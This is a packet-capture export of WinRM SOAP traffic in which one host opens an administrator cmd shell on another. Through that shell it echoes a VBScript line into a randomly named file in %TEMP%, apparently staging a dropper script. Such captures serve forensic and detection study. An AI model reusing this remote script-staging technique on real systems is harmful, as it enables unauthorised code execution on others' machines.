frame.number	ip.src	tcp.srcport	ip.dst	tcp.dstport	http.file_data
6907	192.168.1.3	35711	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:021e7bd0-120f-db4c-ea4b-fe6fdf77b451</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Create</a:Action><w:OptionSet><w:Option Name="WINRS_NOPROFILE">FALSE</w:Option><w:Option Name="WINRS_CODEPAGE">437</w:Option></w:OptionSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Shell>\n    <rsp:InputStreams>stdin</rsp:InputStreams>\n    <rsp:OutputStreams>stdout stderr</rsp:OutputStreams>\n    </rsp:Shell>\n    </env:Body></env:Envelope>\n    
6909	192.168.2.2	5985	192.168.1.3	35711	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.xmlsoap.org/ws/2004/09/transfer/CreateResponse</a:Action><a:MessageID>uuid:66DE16FE-506B-4BA8-8F78-F3CE156B06D0</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:021e7bd0-120f-db4c-ea4b-fe6fdf77b451</a:RelatesTo></s:Header><s:Body><x:ResourceCreated><a:Address>http://192.168.2.2:5985</a:Address><a:ReferenceParameters><w:ResourceURI>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet></a:ReferenceParameters></x:ResourceCreated><rsp:Shell xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell"><rsp:ShellId>131DB2EF-61AF-45D4-BBFE-9BD6A4944228</rsp:ShellId><rsp:ResourceUri>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</rsp:ResourceUri><rsp:Owner>administrator</rsp:Owner><rsp:ClientIP>192.168.1.3</rsp:ClientIP><rsp:IdleTimeOut>PT7200.000S</rsp:IdleTimeOut><rsp:InputStreams>stdin</rsp:InputStreams><rsp:OutputStreams>stdout stderr</rsp:OutputStreams><rsp:ShellRunTime>P0DT0H0M0S</rsp:ShellRunTime><rsp:ShellInactivity>P0DT0H0M0S</rsp:ShellInactivity></rsp:Shell></s:Body></s:Envelope>
6917	192.168.1.3	41519	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:abb80568-30e8-b404-e419-c74ab82027d1</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action><w:OptionSet><w:Option Name="WINRS_CONSOLEMODE_STDIN">TRUE</w:Option><w:Option Name="WINRS_SKIP_CMD_SHELL">FALSE</w:Option></w:OptionSet><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:CommandLine>\n        <rsp:Command>&quot; echo If  Not w3 Then _ >>%TEMP%\BXAzS.vbs &quot;</rsp:Command>\n      </rsp:CommandLine>\n    </env:Body></env:Envelope>\n    
6919	192.168.2.2	5985	192.168.1.3	41519	
6925	192.168.1.3	40237	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:abb80568-30e8-b404-e419-c74ab82027d1</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Command</a:Action><w:OptionSet><w:Option Name="WINRS_CONSOLEMODE_STDIN">TRUE</w:Option><w:Option Name="WINRS_SKIP_CMD_SHELL">FALSE</w:Option></w:OptionSet><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:CommandLine>\n        <rsp:Command>&quot; echo If  Not w3 Then _ >>%TEMP%\BXAzS.vbs &quot;</rsp:Command>\n      </rsp:CommandLine>\n    </env:Body></env:Envelope>\n    
6927	192.168.2.2	5985	192.168.1.3	40237	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandResponse</a:Action><a:MessageID>uuid:0229C3A4-4DF1-4584-A956-80AA791A1EFA</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:abb80568-30e8-b404-e419-c74ab82027d1</a:RelatesTo></s:Header><s:Body><rsp:CommandResponse><rsp:CommandId>29B6CA98-70E1-4DAC-AE95-F384DC5DEC65</rsp:CommandId></rsp:CommandResponse></s:Body></s:Envelope>
6935	192.168.1.3	33395	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:f9434522-b809-47db-4036-dc78b915d187</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Receive>\n        <rsp:DesiredStream CommandId="29B6CA98-70E1-4DAC-AE95-F384DC5DEC65">stdout stderr</rsp:DesiredStream>\n      </rsp:Receive>\n    </env:Body></env:Envelope>\n    
6937	192.168.2.2	5985	192.168.1.3	33395	
6943	192.168.1.3	43807	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:f9434522-b809-47db-4036-dc78b915d187</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Receive</a:Action><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body>\n      <rsp:Receive>\n        <rsp:DesiredStream CommandId="29B6CA98-70E1-4DAC-AE95-F384DC5DEC65">stdout stderr</rsp:DesiredStream>\n      </rsp:Receive>\n    </env:Body></env:Envelope>\n    
6945	192.168.2.2	5985	192.168.1.3	43807	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/ReceiveResponse</a:Action><a:MessageID>uuid:B6F44CB5-7733-4110-BCBE-34499DDFAE3B</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:f9434522-b809-47db-4036-dc78b915d187</a:RelatesTo></s:Header><s:Body><rsp:ReceiveResponse><rsp:CommandState CommandId="29B6CA98-70E1-4DAC-AE95-F384DC5DEC65" State="http://schemas.microsoft.com/wbem/wsman/1/windows/shell/CommandState/Done"><rsp:ExitCode>0</rsp:ExitCode></rsp:CommandState></rsp:ReceiveResponse></s:Body></s:Envelope>
6953	192.168.1.3	41403	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:643c49ce-b705-7836-9086-02430d56a120</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:Signal CommandId="29B6CA98-70E1-4DAC-AE95-F384DC5DEC65">\n        <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>\n      </rsp:Signal>\n    </env:Body></env:Envelope>\n    
6955	192.168.2.2	5985	192.168.1.3	41403	
6961	192.168.1.3	38991	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:643c49ce-b705-7836-9086-02430d56a120</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/Signal</a:Action><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet>\n    </env:Header>\n     <env:Body>\n      <rsp:Signal CommandId="29B6CA98-70E1-4DAC-AE95-F384DC5DEC65">\n        <rsp:Code>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/signal/terminate</rsp:Code>\n      </rsp:Signal>\n    </env:Body></env:Envelope>\n    
6963	192.168.2.2	5985	192.168.1.3	38991	<s:Envelope xml:lang="en-US" xmlns:s="http://www.w3.org/2003/05/soap-envelope" xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd" xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"><s:Header><a:Action>http://schemas.microsoft.com/wbem/wsman/1/windows/shell/SignalResponse</a:Action><a:MessageID>uuid:2F714B53-1605-4E7C-9A96-B65E8A24328B</a:MessageID><a:To>http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:To><a:RelatesTo>uuid:643c49ce-b705-7836-9086-02430d56a120</a:RelatesTo></s:Header><s:Body><rsp:SignalResponse/></s:Body></s:Envelope>
6971	192.168.1.3	41323	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:913322f7-bc7d-b447-948f-51b12f266b08</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body/></env:Envelope>\n    
6973	192.168.2.2	5985	192.168.1.3	41323	
6979	192.168.1.3	46603	192.168.2.2	5985	\n      <?xml version="1.0" encoding="UTF-8"?>\n      <env:Envelope xmlns:a="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:b="http://schemas.dmtf.org/wbem/wsman/1/cimbinding.xsd"\n      xmlns:cfg="http://schemas.microsoft.com/wbem/wsman/1/config" xmlns:env="http://www.w3.org/2003/05/soap-envelope"\n      xmlns:n="http://schemas.xmlsoap.org/ws/2004/09/enumeration" xmlns:p="http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd"\n      xmlns:rsp="http://schemas.microsoft.com/wbem/wsman/1/windows/shell" xmlns:w="http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd"\n      xmlns:x="http://schemas.xmlsoap.org/ws/2004/09/transfer" xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n      xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"> \n      <env:Header>\n      <a:To>http://192.168.2.2:5985</a:To>\n      <a:ReplyTo>\n        <a:Address mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous</a:Address>\n      </a:ReplyTo>\n      <w:MaxEnvelopeSize mustUnderstand="true">153600</w:MaxEnvelopeSize>\n      <a:MessageID>uuid:913322f7-bc7d-b447-948f-51b12f266b08</a:MessageID>\n      <w:Locale mustUnderstand="false" xml:lang="en-US"/>\n      <p:DataLocale mustUnderstand="false" xml:lang="en-US"/>\n      <w:OperationTimeout>PT60S</w:OperationTimeout>\n      <w:ResourceURI mustUnderstand="true">http://schemas.microsoft.com/wbem/wsman/1/windows/shell/cmd</w:ResourceURI>\n      <a:Action mustUnderstand="true">http://schemas.xmlsoap.org/ws/2004/09/transfer/Delete</a:Action><w:SelectorSet><w:Selector Name="ShellId">131DB2EF-61AF-45D4-BBFE-9BD6A4944228</w:Selector></w:SelectorSet>\n    </env:Header>\n    <env:Body/></env:Envelope>\n    
